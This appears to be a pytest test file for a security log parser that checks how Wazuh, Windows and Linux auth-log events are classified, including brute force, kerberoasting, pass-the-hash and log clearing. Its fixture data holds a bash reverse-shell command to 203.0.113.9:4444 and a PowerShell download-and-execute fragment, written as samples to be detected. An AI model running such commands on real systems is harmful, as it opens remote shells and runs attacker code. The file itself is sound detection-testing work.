import gzip
import json
import os
import sys
import types
from datetime import datetime, timezone
from zoneinfo import ZoneInfo

from conftest import win_event

from vtl.models import Severity
from vtl.parsers import ParseStats
from vtl.parsers.linux import parse_linux
from vtl.parsers.wazuh import level_to_severity, parse_wazuh
from vtl.parsers.windows import parse_windows

# ---------------------------------------------------------------- Wazuh


def test_wazuh_ndjson(samples):
    events = parse_wazuh(samples / "alerts.json")
    assert len(events) == 7
    brute = events[0]
    assert brute.source == "Wazuh"
    assert brute.code == "5712"
    assert brute.host == "web01"
    assert brute.src_ip == "203.0.113.47"
    assert brute.severity is Severity.MEDIUM
    assert brute.tags == ["T1110"]
    assert brute.ts == datetime(2026, 9, 29, 10, 33, 41, 208000, timezone.utc)


def test_wazuh_json_array_and_opensearch_export(tmp_path):
    alert = {
        "timestamp": "2026-01-01T00:00:00.000+0000",
        "rule": {"id": "1", "level": 13, "description": "x"},
        "agent": {"name": "a"},
    }
    p = tmp_path / "export.json"
    p.write_text(json.dumps([alert, {"_source": alert}]))
    events = parse_wazuh(p)
    assert len(events) == 2
    assert all(e.severity is Severity.HIGH for e in events)


def test_wazuh_bad_lines_are_skipped(tmp_path):
    p = tmp_path / "alerts.json"
    p.write_text(
        'not json\n{"timestamp": "2026-01-01T00:00:00Z", "rule": {"id": "2", "level": 3, "description": "ok"}}\n{"rule": {}}\n'
    )
    stats = ParseStats()
    events = parse_wazuh(p, stats)
    assert len(events) == 1
    assert stats.skipped == 2


def test_wazuh_level_mapping():
    assert [level_to_severity(level) for level in (0, 3, 4, 8, 12, 15)] == [
        Severity.INFO,
        Severity.INFO,
        Severity.LOW,
        Severity.MEDIUM,
        Severity.HIGH,
        Severity.CRITICAL,
    ]


# ---------------------------------------------------------------- Windows


def test_windows_sample(samples):
    events = parse_windows(samples / "windows.xml")
    by_code = {}
    for e in events:
        by_code.setdefault(e.code, []).append(e)

    assert all(e.host == "WS-FIN-07" for e in events), "FQDN is shortened to the host name"
    # six 4625s collapse into one brute-force event
    assert len(by_code["4625"]) == 1
    assert "6 failed logons from 10.0.5.20" in by_code["4625"][0].summary
    # the logon right after the burst is escalated
    net_logon = next(e for e in by_code["4624"] if e.src_ip == "10.0.5.20")
    assert net_logon.severity is Severity.HIGH
    assert "after 6 failed attempts" in net_logon.summary

    service = by_code["7045"][0]
    assert service.severity is Severity.HIGH and "BTOBTO" in service.summary

    ps = next(e for e in by_code["4688"] if "powershell" in e.summary)
    assert "decoded: IEX (New-Object Net.WebClient).DownloadString" in ps.summary
    assert "<200 chars base64>" in ps.summary

    assert by_code["4104"][0].severity is Severity.HIGH
    assert "possible C2" in by_code["3"][0].summary
    assert by_code["10"][0].severity is Severity.CRITICAL
    assert "svc_backup" in by_code["1102"][0].summary


def test_windows_wevtutil_stream_without_root(tmp_path):
    xml = "\n".join(
        [
            '<?xml version="1.0" encoding="utf-8"?>',
            win_event(
                4720,
                "2026-03-01T08:00:00.0000000Z",
                {
                    "TargetUserName": "backdoor",
                    "TargetDomainName": "HOST1",
                    "SubjectUserName": "eve",
                    "SubjectDomainName": "CORP",
                },
            ),
            win_event(
                4732,
                "2026-03-01T08:00:05.0000000Z",
                {
                    "TargetUserName": "Administrators",
                    "MemberSid": "S-1-5-21-1-2-3-1010",
                    "SubjectUserName": "eve",
                    "SubjectDomainName": "CORP",
                },
            ),
            win_event(
                9999,
                "2026-03-01T08:00:06.0000000Z",
                {"Foo": "bar"},
                channel="Application",
                provider="Custom",
            ),
        ]
    )
    p = tmp_path / "export.xml"
    p.write_text(xml)
    events = parse_windows(p)
    assert [e.code for e in events] == ["4720", "4732", "9999"]
    assert "backdoor" in events[0].summary and events[0].severity is Severity.MEDIUM
    assert events[1].severity is Severity.HIGH and "privileged group" in events[1].summary
    assert events[2].summary == "Event 9999 (Custom): Foo=bar"


def test_windows_noise_is_filtered(tmp_path):
    p = tmp_path / "noise.xml"
    p.write_text(
        win_event(
            4634, "2026-03-01T08:00:00Z", {"TargetUserName": "HOST1$", "TargetDomainName": "CORP"}
        )
        + win_event(
            4672,
            "2026-03-01T08:00:00Z",
            {"SubjectUserName": "SYSTEM", "SubjectDomainName": "NT AUTHORITY"},
        )
    )
    stats = ParseStats()
    assert parse_windows(p, stats) == []
    assert stats.filtered == 2


def test_windows_kerberoasting_and_pth(tmp_path):
    p = tmp_path / "k.xml"
    p.write_text(
        win_event(
            4769,
            "2026-03-01T08:00:00Z",
            {
                "TargetUserName": "eve@CORP",
                "ServiceName": "svc_sql",
                "TicketEncryptionType": "0x17",
                "IpAddress": "::ffff:10.0.0.9",
            },
        )
        + win_event(
            4769,
            "2026-03-01T08:00:01Z",
            {"TargetUserName": "eve@CORP", "ServiceName": "DC01$", "TicketEncryptionType": "0x12"},
        )
        + win_event(
            4624,
            "2026-03-01T08:00:02Z",
            {
                "TargetUserName": "eve",
                "TargetDomainName": "CORP",
                "LogonType": "9",
                "LogonProcessName": "seclogo",
                "IpAddress": "::1",
            },
        )
    )
    events = parse_windows(p)
    assert len(events) == 2
    assert "Kerberoasting" in events[0].summary and events[0].src_ip == "10.0.0.9"
    assert events[1].severity is Severity.HIGH and "pass-the-hash" in events[1].summary


def test_windows_evtx_path(tmp_path, monkeypatch):
    """Binary .evtx files go through python-evtx; the record XML shares the XML parser."""
    xml = win_event(1102, "2026-03-01T08:00:00Z")

    class FakeRecord:
        def xml(self):
            return xml

    class FakeEvtx:
        def __init__(self, path):
            self.path = path

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def records(self):
            return [FakeRecord()]

    evtx_pkg = types.ModuleType("Evtx")
    evtx_mod = types.ModuleType("Evtx.Evtx")
    evtx_mod.Evtx = FakeEvtx
    monkeypatch.setitem(sys.modules, "Evtx", evtx_pkg)
    monkeypatch.setitem(sys.modules, "Evtx.Evtx", evtx_mod)

    p = tmp_path / "Security.evtx"
    p.write_bytes(b"ElfFile\x00" + b"\x00" * 120)
    events = parse_windows(p)
    assert len(events) == 1 and events[0].code == "1102"


# ---------------------------------------------------------------- Linux


def test_linux_sample(samples):
    events = parse_linux(samples / "auth.log", year=2026)
    summaries = [e.summary for e in events]
    brute = next(e for e in events if e.summary.startswith("SSH brute force"))
    assert "14 failed logons from 203.0.113.47" in brute.summary
    assert brute.ts == datetime(2026, 9, 29, 10, 31, 2, tzinfo=timezone.utc)
    accepted = next(e for e in events if "accepted: deploy" in e.summary)
    assert accepted.severity is Severity.HIGH
    assert any("User sysupdate added to group sudo" in s for s in summaries)
    assert any("SSH key persistence" in s for s in summaries)
    assert not any("SSH failed" in s or "SSH invalid" in s for s in summaries), (
        "failures are collapsed"
    )
    # cron / systemd-logind / session lines are not security events
    assert not any("cron" in s.lower() for s in summaries)


def test_linux_timezone_conversion(tmp_path):
    p = tmp_path / "auth.log"
    p.write_text(
        "Mar  3 09:15:00 db1 sshd[1]: Accepted publickey for bob from 10.0.0.5 port 22 ssh2\n"
    )
    [e] = parse_linux(p, year=2026, tz=ZoneInfo("Europe/Berlin"))
    assert e.ts == datetime(2026, 3, 3, 8, 15, tzinfo=timezone.utc)


def test_linux_year_rollover_explicit(tmp_path):
    p = tmp_path / "auth.log"
    p.write_text(
        "Dec 31 23:59:58 h useradd[1]: new user: name=a, UID=1001\n"
        "Jan  1 00:00:02 h useradd[2]: new user: name=b, UID=1002\n"
    )
    a, b = parse_linux(p, year=2025)
    assert a.ts.year == 2025 and b.ts.year == 2026


def test_linux_year_from_mtime(tmp_path):
    p = tmp_path / "auth.log"
    p.write_text(
        "Dec 31 23:59:58 h useradd[1]: new user: name=a, UID=1001\n"
        "Jan  1 00:00:02 h useradd[2]: new user: name=b, UID=1002\n"
    )
    mtime = datetime(2026, 1, 1, 0, 5, tzinfo=timezone.utc).timestamp()
    os.utime(p, (mtime, mtime))
    a, b = parse_linux(p)
    assert a.ts.year == 2025 and b.ts.year == 2026


def test_linux_rfc3339_and_gzip(tmp_path):
    line = "2026-09-29T10:36:03.512344+02:00 web02 usermod[9]: add 'mallory' to group 'wheel'\n"
    p = tmp_path / "auth.log.2.gz"
    p.write_bytes(gzip.compress(line.encode()))
    [e] = parse_linux(p)
    assert e.ts == datetime(2026, 9, 29, 8, 36, 3, 512344, timezone.utc)
    assert e.severity is Severity.HIGH and e.host == "web02"


def test_linux_malformed_lines(tmp_path):
    p = tmp_path / "auth.log"
    p.write_text("garbage line\n\nFoo 12 10:00:00 h sshd[1]: x\n")
    stats = ParseStats()
    assert parse_linux(p, stats, year=2026) == []
    assert stats.skipped == 2


def test_linux_sudo_failures_and_su(tmp_path):
    p = tmp_path / "secure"
    p.write_text(
        "Sep 29 11:00:00 h sudo:    eve : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/eve ; USER=root ; COMMAND=/bin/bash\n"
        "Sep 29 11:00:05 h su[5]: pam_unix(su-l:session): session opened for user root(uid=0) by eve(uid=1000)\n"
        "Sep 29 11:00:09 h sudo:   eve : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"
    )
    fail, su, shell = parse_linux(p, year=2026)
    assert fail.severity is Severity.MEDIUM and "authentication failure" in fail.summary
    assert su.summary == "su session opened: eve -> root"
    assert shell.severity is Severity.CRITICAL and "reverse shell" in shell.summary
